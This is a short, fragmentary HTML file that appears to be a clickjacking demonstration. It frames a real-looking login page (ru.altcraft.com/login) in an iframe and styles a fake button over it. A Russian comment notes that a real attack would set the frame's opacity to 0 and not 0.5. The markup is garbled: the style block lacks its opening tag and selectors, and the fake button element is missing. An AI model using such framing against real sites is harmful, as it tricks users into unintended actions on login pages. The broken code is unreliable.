<!DOCTYPE html>
<html>
<head>

            width: 100%;
            height: 500px;
            border: none;
            opacity: 0.5; /* Делаем полупрозрачным для наглядности. В реальной атаке было бы 0 */
        }
        .fake-button {
            position: absolute;

            color: white;

    <!-- iframe, который загружает целевую страницу -->
    <iframe src="http://ru.altcraft.com/login"></iframe>
</body>
</html>
